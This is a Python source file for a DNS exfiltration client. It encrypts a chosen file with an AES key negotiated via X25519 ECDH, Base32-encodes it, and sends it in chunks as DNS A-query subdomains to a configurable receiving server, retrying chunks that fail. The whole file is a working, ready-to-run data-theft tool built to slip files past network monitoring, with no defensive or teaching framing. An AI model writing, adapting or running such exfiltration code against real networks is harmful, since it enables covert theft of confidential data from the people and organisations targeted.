#!/usr/bin/env python3
"""
Module Name: client.py

Description: DNS exfiltration client using X25519 key exchange, AES-GCM encryption, and Base32 encoding.
Performs Perfect Forward Secrecy by negotiating a per-transfer AES key via ECDH. The client encrypts a file,
Base32-encodes it, splits it into DNS-safe chunks, and exfiltrates it over DNS A queries.

Author: John Burns
Date: 2025-05-02
Version: 2.1 (ECDH key negotiation, AES-GCM encryption, Base32 encoding with DNS-safe labels)
"""

import argparse
import base64
import logging
import os
import socket
from math import ceil
from uuid import uuid4

from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dnslib import DNSRecord, DNSQuestion, QTYPE
from dotenv import load_dotenv, find_dotenv

load_dotenv(find_dotenv())

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('client')

MAX_RETRIES = 3  # Retry count per chunk


def load_server_pubkey(path):
    """Load the server's public key from a raw file."""
    with open(path, 'rb') as f:
        return x25519.X25519PublicKey.from_public_bytes(f.read())


def derive_shared_key(client_private_key, server_public_key):
    """Derive a shared AES key using ECDH and HKDF."""
    shared_secret = client_private_key.exchange(server_public_key)
    return HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'dns-exfil'
    ).derive(shared_secret)


def encrypt_data(aes_key, raw: bytes) -> bytes:
    """
    Encrypt raw bytes with AES-GCM: returns nonce||ciphertext||tag.
    """
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, raw, associated_data=None)
    return nonce + ct


def encode_file_contents(file_path, aes_key):
    """Read file, encrypt using AES-GCM, then return Base32-encoded string (unpadded)."""
    with open(file_path, 'rb') as f:
        raw = f.read()
    encrypted = encrypt_data(aes_key, raw)
    return base64.b32encode(encrypted).decode('ascii').rstrip('=')


def chunk_data(data, size):
    """Yield successive size-character chunks from data."""
    for i in range(0, len(data), size):
        yield data[i:i + size]


def send_dns_query(subdomain, args):
    """Send one DNS A query for the given subdomain."""
    fqdn = f"{subdomain}.{args.domain}"
    query = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    data = query.pack()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.settimeout(2)
        sock.sendto(data, (args.server_ip, args.server_port))
        response, _ = sock.recvfrom(4096)
        logger.info(f"Received response: {DNSRecord.parse(response)}")
    except socket.timeout:
        logger.warning("No response received for %s", fqdn)
    except Exception as e:
        logger.error("Error sending DNS query: %s", e)
    finally:
        sock.close()


def reliable_send(subdomain, args, retries=MAX_RETRIES):
    """Send DNS query and retry if no response."""
    fqdn = f"{subdomain}.{args.domain}"
    query = DNSRecord(q=DNSQuestion(fqdn, QTYPE.A))
    data = query.pack()
    for attempt in range(1, retries + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.settimeout(2)
            sock.sendto(data, (args.server_ip, args.server_port))
            response, _ = sock.recvfrom(1024)
            print(f"✓ Received response for chunk [{subdomain[:40]}...]:", DNSRecord.parse(response).short())
            return True
        except socket.timeout:
            print(f"⚠️ Timeout (attempt {attempt}) for chunk [{subdomain[:40]}...]")
        except Exception as e:
            print(f"❌ Error sending chunk [{subdomain[:40]}...]: {e}")
        finally:
            sock.close()
    return False


def main(args):
    identifier = str(uuid4()).replace('-', '')[:8]

    # Perform ECDH key negotiation
    server_pub = load_server_pubkey(args.server_pubkey)
    client_priv = x25519.X25519PrivateKey.generate()
    client_pub_bytes = client_priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )
    aes_key = derive_shared_key(client_priv, server_pub)

    # Send client ephemeral public key split across DNS-safe labels
    pubkey_b32 = base64.b32encode(client_pub_bytes).decode('ascii').rstrip('=')
    parts = [pubkey_b32[i:i+50] for i in range(0, len(pubkey_b32), 50)]
    key_exchange_subdomain = f"{identifier}-0-0-" + ".".join(parts)
    send_dns_query(key_exchange_subdomain, args)

    # Encrypt and encode file
    encoded_data = encode_file_contents(args.file_path, aes_key)
    max_length = 63 - len(identifier) - 16 - 3
    segments = list(chunk_data(encoded_data, max_length))
    total_segments = len(segments)

    print(f"Sending {total_segments} chunks for identifier: {identifier}")
    failures = []
    for i, chunk in enumerate(segments):
        subdomain = f"{identifier}-{i}-{total_segments}-{chunk}"
        if len(subdomain) > 63:
            print(f"❗ Subdomain too long ({len(subdomain)} chars), skipping: {subdomain}")
            continue
        if not reliable_send(subdomain, args):
            failures.append(i)

    if failures:
        print(f"\n❌ Failed to send {len(failures)} chunks after {MAX_RETRIES} retries:")
        print(failures)
    else:
        print("\n✅ All chunks sent successfully.")


def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Client (ECDH + AES-GCM + Base32)")
    parser.add_argument("--server-ip", default="127.0.0.1", help="IP address of the DNS exfil server")
    parser.add_argument("--server-port", type=int, default=5300, help="UDP port of the DNS exfil server")
    parser.add_argument("--file-path", required=True, help="Path to the file to exfiltrate")
    parser.add_argument("--domain", default="xf.example.com", help="Domain suffix for queries")
    parser.add_argument("--server-pubkey", default=os.getenv("SERVER_PUBLIC_KEY"), help="Path to server's public key")
    return parser.parse_args()


if __name__ == "__main__":
    main(get_args())